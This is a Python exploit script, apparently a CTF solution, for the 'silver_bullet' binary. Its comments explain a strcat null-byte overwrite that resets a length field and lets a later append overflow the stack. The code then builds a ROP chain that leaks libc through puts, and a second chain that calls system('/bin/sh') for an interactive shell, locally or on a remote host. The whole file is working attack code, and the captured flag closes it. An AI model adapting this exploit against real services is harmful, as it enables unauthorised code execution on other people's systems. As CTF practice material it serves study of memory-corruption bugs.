#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./silver_bullet_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./silver_bullet_patched
b *0x80488fb
b *0x8048a19
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def create_bullet(desc):
    sla(b'choice :', b'1')
    sa(b'bullet :', desc)

def power_up(desc):
    sla(b'choice :', b'2')
    sa(b'bullet :', desc)

def beat():
    sla(b'choice :', b'3')

# ==================== EXPLOIT ====================
p = start()

'''
The strcat() function shall append a copy of the string pointed to
       by s2 (including the terminating NUL character) to the end of the
       string pointed to by s1.  The initial byte of s2 overwrites the
       NUL character at the end of s1.  If copying takes place between
       objects that overlap, the behavior is undefined.
'''

# Due to the fact that the program uses strcat() to concatenate the description of the bullet with the new description.
# Since the strcat() function appends NULL character at the end of the string after concatenation
# we successfully zero out the length of the description, so that after the update, out description len will be
# 08048907        size_t buffer_len = strlen(&buf);
# 08048917        uint32_t len = bullet->len + buffer_len;
# Without size check, the next strcat() will cause buffer overflow and overwrite the return address of main function
create_bullet(b'A' * 0x2f)
# zero out the length of new description
power_up(b'A')

pop_ebx = 0x8048475
ret = 0x8048594

# The size is big enough to win the game and trigger the program to return
payload = b'\xff' * 0x3
payload += b'A' * 0x4
# We need to construct the ROP chain that satisfy the calling convention on x86 architecture, which is:
# Return address
# Return address of the function we want to call
# Arg1
# ...
payload += p32(exe.plt.puts)
payload += p32(pop_ebx)
payload += p32(exe.got.puts)
payload += p32(exe.sym.main) # return to main
power_up(payload)
beat()

libc_base = u32(ru(b'Oh ! You win !!\n', b'\n')) - 0x5f140
info("libc base @ %#x", libc_base)

# Do the same thing to get the shell
create_bullet(b'B' * 0x2f)
power_up(b'A')

payload = b'\xff' * 0x3
payload += b'B' * 0x4
payload += p32(libc_base + 0x3a940)
payload += p32(0xdeadbeef) # dummy return address
payload += p32(libc_base + 0x158e8b) # binsh
power_up(payload)
beat()

interactive()
# FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
